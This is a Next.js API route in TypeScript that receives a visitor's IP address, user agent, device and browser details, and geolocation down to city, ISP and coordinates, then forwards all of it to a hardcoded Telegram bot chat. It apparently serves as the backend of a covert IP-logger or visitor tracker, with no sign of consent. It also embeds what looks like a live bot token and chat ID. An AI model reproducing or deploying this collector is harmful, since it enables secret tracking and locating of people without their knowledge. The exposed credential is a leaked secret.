import { NextResponse } from "next/server";
const BOT_TOKEN = "7796828329:AAFzE55aLC9LZg92bnukBeZf70JkpWR5KVo";
const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
const CHAT_ID = "5944280734";

const sendToTelegram = async (message: string) => {
  const response = await fetch(TELEGRAM_API_URL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
    }),
  });

  if (!response.ok) {
    throw new Error("Failed to send message to Telegram");
  }
};

export async function POST(req: Request) {
  try {
    const { ip, userAgent, deviceInfo, geolocation } = await req.json();
    const message = `
            User Info:
            IP: ${ip}
            User-Agent: ${userAgent}
            
            Device Info:
            Device Type: ${deviceInfo.device?.type || "Unknown"}
            Device Model: ${deviceInfo.device?.model || "Unknown"}
            OS: ${deviceInfo.os?.name} ${deviceInfo.os?.version || "Unknown"}
            Browser: ${deviceInfo.browser?.name} ${
      deviceInfo.browser?.version || "Unknown"
    }
            CPU Architecture: ${deviceInfo.cpu?.architecture || "Unknown"}
            
            Geolocation:
            Country: ${geolocation.country || "Unknown"}
            Region: ${geolocation.region || "Unknown"}
            City: ${geolocation.city || "Unknown"}
            ISP: ${geolocation.isp || "Unknown"}
            Latitude: ${geolocation.lat || "Unknown"}
            Longitude: ${geolocation.lon || "Unknown"}
        `;

    await sendToTelegram(message);

    return NextResponse.json({
      message: "Message sent to Telegram successfully",
    });
  } catch (error) {
    return NextResponse.json(
      { message: "Failed to send message" },
      { status: 500 }
    );
  }
}
